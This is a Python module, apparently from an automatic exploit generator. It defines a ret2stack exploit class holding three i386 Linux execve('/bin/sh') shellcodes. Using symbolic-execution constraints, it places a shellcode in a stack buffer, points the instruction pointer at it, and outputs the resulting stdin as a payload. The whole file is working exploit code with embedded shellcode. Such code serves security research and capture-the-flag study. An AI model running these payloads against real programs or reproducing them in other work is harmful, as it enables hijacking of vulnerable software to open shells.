from ..exploit import Exploit
import logging

l = logging.getLogger('aegg.exploits.ret2stack')


class Ret2Stack(Exploit):
    SHELLCODES = [
        'jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80',  # 22 bytes: shellcraft i386.linux.sh
        '1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80',  # 21 bytes
        '1\xc0\xb00\x01\xc40\xc0Ph//shh/bin\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80',  # for scanf
    ]

    def __init__(self, path, analysis):
        super(Ret2Stack, self).__init__(path, analysis)
        self.trying = 0
        self.shellcode = Ret2Stack.SHELLCODES[self.trying]

    def _generate(self, buf):
        if buf['length'] < len(self.shellcode):
            return False
        memory = self.path.state.memory.load(buf['addr'], len(self.shellcode))
        sc = self.path.state.se.BVV(self.shellcode)

        l.debug('Checking SHELLCODES[%d] in buf len: %d, addr: %x ...' %
                (self.trying, buf['length'], buf['addr']))
        if self.path.state.satisfiable(
                extra_constraints=(memory == sc,
                                   self.path.state.ip == buf['addr'])):
            l.debug('... sat!')
            self.path.state.add_constraints(memory == sc)
            self.path.state.add_constraints(self.path.state.ip == buf['addr'])

            self.payload = self.path.state.posix.dumps(0)
            return True
        l.debug('... unsat!')
        return False

    def gen_next(self):
        self.trying += 1
        if self.trying >= len(Ret2Stack.SHELLCODES):
            return False
        self.shellcode = Ret2Stack.SHELLCODES[self.trying]
        return True

    def generate(self):
        for buf in self.analysis['bufs']:
            if self._generate(buf):
                return self.payload
